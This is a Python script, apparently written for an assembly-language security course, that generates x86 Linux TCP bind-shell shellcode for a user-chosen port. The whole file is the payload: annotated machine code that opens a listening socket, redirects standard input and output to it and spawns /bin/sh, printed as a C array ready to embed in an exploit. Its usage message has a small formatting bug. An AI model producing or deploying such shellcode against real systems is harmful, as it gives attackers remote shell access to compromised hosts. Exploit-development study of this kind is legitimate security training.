#!/usr/bin/env python3
"""
x86 Linux TCP Bindshell Generator
Handles portnumbers which have NULs in their hex representation
Usage: this_script.py <port_to_bind>
Author: fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""
from sys import argv

if len(argv) != 2:
    print('Usage: %s <port_to_bind>')
    raise SystemExit

port = int(argv[1])

if port > 65535:
    print('ERROR: Port number cannot be greater than 65535.')
    raise SystemExit

if port < 1024:
    print('WARN: Port numbers below 1024 can only be bound by root!')

if port < 256:
    if len(hex(port)) < 4:
        hexport = '0' + hex(port)[-1:]
    else:
        hexport = hex(port)[-2:]

    HANDLE_PORT_NUMBER = ("\x80\xc6" +  # add dh <port number low bytes>
                          bytearray.fromhex(hexport).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx
elif hex(port)[-2:] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
                          bytearray.fromhex(hex(port)[2:4]).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx

else:
    HANDLE_PORT_NUMBER = ("\x66\x68" +  # push word <big endian port number>
                          bytearray.fromhex(hex(port)[-4:-2]).decode('iso-8859-1') +
                          bytearray.fromhex(hex(port)[-2:]).decode('iso-8859-1'))

shellcode = bytearray("\x31\xdb"  # xor ebx, ebx
                      "\xf7\xe3"              # mul ebx
                      "\x50"                  # push eax
                      "\x43"                  # inc ebx
                      "\x53"                  # push ebx
                      "\x6a\x02"              # push 0x02
                      "\x89\xe1"              # mov ecx, esp
                      "\xb0\x66"              # mov al, 0x66
                      "\xcd\x80"              # int 0x80
                      "\x5f"                  # pop edi
                      "\x97"                  # xchg edi, eax
                      "\x93"                  # xchg ebx, eax
                      "\xb0\x66"              # mov al, 0x66
                      "\x52"

                      + HANDLE_PORT_NUMBER +

                      "\x66\x53"              # push bx
                      "\x89\xe1"              # mov ecx, esp
                      "\x6a\x10"              # push 0x10
                      "\x51"                  # push ecx
                      "\x57"                  # push edi
                      "\x89\xe1"              # mov ecx, esp
                      "\xcd\x80"              # int 0x80
                      "\x89\x51\x04"          # mov dword ptr [ecx + 0x04], edx
                      "\x80\xc3\x02"          # mov bl, 0x02
                      "\xb0\x66"              # mov al, 0x66
                      "\xcd\x80"              # int 0x80
                      "\x43"                  # inc ebx
                      "\xb0\x66"              # mov al, 0x66
                      "\xcd\x80"              # int 0x80
                      "\x93"                  # xchg bx, eax
                      "\x89\xd1"              # mov ecx, edx
                      "\xb1\x02"              # mov cl, 0x02
                      "\xb0\x3f"              # mov al, 0x3f
                      "\xcd\x80"              # int 0x80
                      "\x49"                  # dec ecx
                      "\x79\xf9"              # jns short [esp - 5]
                      "\x52"                  # push edx
                      "\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
                      "\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
                      "\x89\xe3"              # mov ebx, esp
                      "\x52"                  # push edx
                      "\x89\xe2"              # mov edx, esp
                      "\x52"                  # push edx
                      "\x89\xe1"              # mov ecx, esp
                      "\xb0\x0b"              # mov al, 0x0b
                      "\xcd\x80",             # int 0x80
                      'iso-8859-1')

final_shellcode = ''

for i in shellcode:
    final_shellcode += '\\x'
    final_shellcode += '%02x' % (i & 0xff)

print("x86 Linux TCP Bind Shell on port " + str(port))
print("Length: " + str(len(shellcode)) + "\n")
print("unsigned char shellcode[] = \"" + final_shellcode + "\"")
